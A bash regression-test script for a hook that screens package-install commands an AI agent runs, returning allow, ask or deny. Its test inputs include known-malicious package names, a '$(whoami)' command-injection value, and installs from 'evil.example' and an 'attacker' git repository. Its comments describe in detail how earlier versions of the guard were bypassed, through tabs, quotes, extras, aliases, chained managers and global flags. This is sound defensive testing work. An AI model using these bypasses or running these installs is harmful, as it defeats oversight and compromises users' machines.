#!/usr/bin/env bash
# Cases for plugins/phoenix-security-review/hooks/pre-bash-package-guard.sh
#
# This hook had four bypasses fixed in #4/#5 and two more after review, and every
# one of them produced the same observable behaviour: permissionDecision "allow",
# emitted confidently, with nothing checked. There was no test, so the only way to
# notice was to read the pipeline carefully enough to see which tokens fell out of
# it. These cases assert on the decision, which is the part that matters.
#
#     bash scripts/test-package-guard.sh
#
# Exit 0 all pass, 1 on any failure.

set -u

HERE="$(cd "$(dirname "$0")" && pwd)"
HOOK="$HERE/../plugins/phoenix-security-review/hooks/pre-bash-package-guard.sh"

if [ ! -f "$HOOK" ]; then
  echo "cannot find the hook at $HOOK" >&2
  exit 1
fi

STUB="$(mktemp -d)"
trap 'rm -rf "$STUB"' EXIT

# The guard asks registry.npmjs.org about brand-newness and install scripts. A test
# that needs the network is a test that fails on a plane, so a stub curl earlier in
# PATH makes every case hermetic -- and exercises exactly the path a user behind a
# firewall already gets.
printf '#!/bin/sh\nexit 1\n' > "$STUB/curl"
chmod +x "$STUB/curl"

# The hook shells out to `python3` by name. Windows ships a python3.exe App
# Execution Alias that `command -v` finds and that then refuses to run, so probe by
# running one rather than by looking one up.
PY3=""
for c in python3 python py; do
  if command -v "$c" >/dev/null 2>&1 && "$c" -c 'import sys' >/dev/null 2>&1; then
    PY3="$c"
    break
  fi
done
if [ -z "$PY3" ]; then
  echo "a working python3 (or python) is required to run these cases" >&2
  exit 1
fi
if [ "$PY3" != "python3" ]; then
  printf '#!/bin/sh\nexec %s "$@"\n' "$PY3" > "$STUB/python3"
  chmod +x "$STUB/python3"
fi

PATH="$STUB:$PATH"
export PATH

decision() {
  "$PY3" -c 'import json,sys;print(json.dumps({"tool_input":{"command":sys.argv[1]}}))' "$1" \
    | bash "$HOOK" 2>/dev/null \
    | "$PY3" -c 'import json,sys
try:
    print(json.load(sys.stdin)["hookSpecificOutput"]["permissionDecision"])
except Exception:
    print("NO-JSON")'
}

FAILURES=0
check() {  # check <expected> <label> <command>
  want="$1"; label="$2"; cmd="$3"
  got="$(decision "$cmd")"
  if [ "$got" = "$want" ]; then
    printf '  ok    %-5s  %s\n' "$got" "$label"
  else
    printf '  FAIL  wanted %s, got %s -- %s\n' "$want" "$got" "$label"
    FAILURES=$((FAILURES + 1))
  fi
}

TAB="$(printf '\t')"

echo "the bypasses"
# Was allow: only literal spaces were split, so the whole tab-joined token failed
# the whitelist, PACKAGES came out empty, and nothing was checked -- including
# event-stream, which is on the hook's own built-in blocklist.
check deny  "tab-separated packages are still checked" \
            "npm install event-stream${TAB}lodash"
# Was allow: the whitelist rejected [ and ] so an extras spec emptied PACKAGES.
check deny  "pip extras cannot hide a blocklisted name" \
            "pip install colourama[socks]"
# Was allow: arguments that parsed to nothing were indistinguishable from having
# no arguments at all.
check ask   "unreadable arguments ask rather than allow" \
            'npm install pkg$(whoami)'

echo
echo "still denies what it always denied"
check deny  "a blocklisted npm package"      "npm install event-stream"
check deny  "a blocklisted pip package"      "pip install colourama"
check deny  "a blocklisted name among others" "npm install @types/node event-stream"
check deny  "pip3, not just pip"             "pip3 install colourama"
check deny  "a path-invoked package manager" "/usr/local/bin/npm install event-stream"

echo
echo "does not cry wolf"
check allow "an ordinary install"            "npm install lodash"
check allow "tab-separated safe packages"    "pip install requests${TAB}flask"
check allow "extras on a safe package"       "pip install requests[socks]"
check allow "install from a lockfile"        "npm install"
check allow "flags only"                     "npm install --production"
check allow "a requirements file"            "pip install -r requirements.txt"
check allow "not an install at all"          "ls -la /tmp"
check deny  "a quoted package name is read"  'npm install "event-stream"'
# Widening the whitelist to admit quotes without trimming them correctly put a NEW
# bypass in: bash reads the ' inside ${p%'} as opening a quoted region, so the
# single-quote trim was a no-op and `npm install 'event-stream'` returned allow.
# A shell removes quotes during word expansion, so all four of these reach npm as
# event-stream and all four must be checked as event-stream.
check deny  "single-quoted package name"     "npm install 'event-stream'"
check deny  "quotes in the middle of a name" "npm install 'event'-stream"
check deny  "a stray quote inside a name"    "npm install ev'ent-stream"
# The empty-PACKAGES ask was per-command, so one readable argument silently covered
# for every unreadable one beside it.
check ask   "an unreadable argument beside a readable one"             'npm install lodash pkg$(whoami)'

echo
echo "more than one package manager on a line"
# Was allow: the detector took the first PM_PATTERNS key that matched, and because that
# is an associative array "first" meant bash hash order. `pip install requests && npm
# install event-stream` was classified python, so the lookup was python:event-stream,
# which is not an entry, and a known-malicious npm package was installed with approval.
check deny  "second manager is checked too"  "pip install requests && npm install event-stream"
check deny  "first manager is checked too"   "npm install event-stream && pip install requests"
check deny  "separated by a semicolon"       "pip install requests; npm install event-stream"

echo
echo "install forms that are not a bare name"
# Was allow: clean_pkg cut at the @ and handed the blocklist the alias.
check deny  "npm alias resolves to the real package" "npm install safe-name@npm:event-stream"
# Was allow: clean_pkg's composer `vendor:` strip cut every URL down to its scheme, so
# the blocklist was asked about the string "https".
check ask   "a tarball URL is unverifiable, not clean"             "npm install https://evil.example/event-stream.tgz"
check ask   "a git ref is unverifiable too"             "pip install git+https://github.com/attacker/colourama"
check allow "composer vendor:package still reads"  "composer require monolog/monolog"

echo
echo "a global flag before the subcommand"
# Was allow: every pattern required the subcommand to touch the program name, so
# `npm --prefix . install x` matched nothing and was waved through unexamined.
check deny  "npm with a global flag"         "npm --prefix . install event-stream"
check deny  "pip with a global flag"         "pip --quiet install colourama"
check deny  "yarn with a global flag"        "yarn --cwd ./x add event-stream"
check allow "a non-install subcommand"       "npm run build"
check allow "a bare query flag"              "npm --version"

echo
echo "the detector over-matches on purpose"
# `npm install` inside a string is read as an install. That is deliberate and it is
# not new: the detector cannot tell `git commit -m "npm install fix"` from
# `sh -c "npm install evil"` without parsing the shell, and of the two mistakes
# available, treating a commit message as an install is the one you can live with.
# The words after it are checked as package names, so an ordinary sentence passes
# quietly and a sentence naming a blocklisted package does not.
check allow "an install mentioned inside a string"             "echo 'run npm install later'"
check deny  "...and a blocklisted name in one still denies"             "echo 'run npm install event-stream later'"

echo
echo "the blocklist is not capped"
# `head -20` used to truncate before any check ran, so a blocklisted package in 21st
# position came back as a nameless "ask" rather than a deny that says which name.
MANY=""
i=1
while [ "$i" -le 25 ]; do MANY="$MANY safe-pkg-$i"; i=$((i + 1)); done
check deny  "a blocklisted name in 26th position" "npm install$MANY event-stream"

echo
echo "no JSON parser is declared, not hidden"
# get_json_field called python3 by name and swallowed its stderr, so on a host without
# a working one CMD came back empty, that read as "not an install", and every install
# of every blocklisted package was approved in silence.
NOPARSE="$(PATH=/usr/bin:/bin "$PY3" -c 'import json,sys;print(json.dumps({"tool_input":{"command":"npm install event-stream"}}))' 2>/dev/null   | PATH=/usr/bin:/bin bash "$HOOK" 2>/dev/null)"
case "$NOPARSE" in
  *permissionDecisionReason*python3*jq*)
    printf '  ok    %-5s  %s
' "says" "a missing parser is reported, not silent" ;;
  *)
    printf '  FAIL  no reason given when no JSON parser exists -- %s
' "${NOPARSE:-<empty>}"
    FAILURES=$((FAILURES + 1)) ;;
esac

echo
if [ "$FAILURES" -gt 0 ]; then
  echo "$FAILURES failure(s)"
  exit 1
fi
echo "all cases pass"
